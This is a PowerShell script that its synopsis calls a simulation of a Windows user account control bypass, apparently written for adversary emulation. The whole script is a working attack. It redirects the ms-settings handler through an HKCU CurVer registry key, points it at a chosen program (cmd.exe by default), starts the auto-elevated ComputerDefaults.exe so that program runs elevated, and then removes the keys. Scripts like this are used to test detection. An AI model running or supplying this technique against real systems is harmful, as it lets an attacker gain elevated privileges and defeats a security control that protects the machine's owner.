<#
.SYNOPSIS
The script simulate user account control bypass by abusing auto elevated process which reads execution parameters from registry.

.DESCRIPTION
Abuses ComputerDefaults auto elevated windows process to execute cmd.exe
 
.EXAMPLE
Invoke-ComputerDefaults 
 
Description
-----------
Executes ComputerDefaults UAC Bypass
#>
function Invoke-ComputerDefaults {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $false)]
        [String]$program= 'cmd.exe'
    )
    Begin {
		$me = whoami.exe
		$adminNames = Get-LocalGroupMember -Group 'Administrators' | Select-Object -ExpandProperty name
        $isAdmin = $adminNames -Contains $me
    }

    Process {
		if( $isAdmin )
		{
			New-Item "HKCU:\Software\Classes\ms-settings\CurVer" -Force
			Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -Value ".bla" -Force
			New-Item "HKCU:\Software\Classes\.bla\Shell\Open\command" -Force
			New-ItemProperty -Path "HKCU:\Software\Classes\.bla\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
			Set-ItemProperty -Path "HKCU:\Software\Classes\.bla\Shell\Open\command" -Name "(default)" -Value $program -Force
			Start-Sleep -s 1
			Start-Process "C:\Windows\System32\ComputerDefaults.exe"
			Start-Sleep -s 1
			Remove-Item "HKCU:\Software\Classes\ms-settings\CurVer" -Recurse -Force
			Remove-Item "HKCU:\Software\Classes\.bla\" -Recurse -Force
		}else
		{
			Add-Type -AssemblyName PresentationFramework;
			[System.Windows.MessageBox]::Show('You have to be Administrator');	
		}
    }

}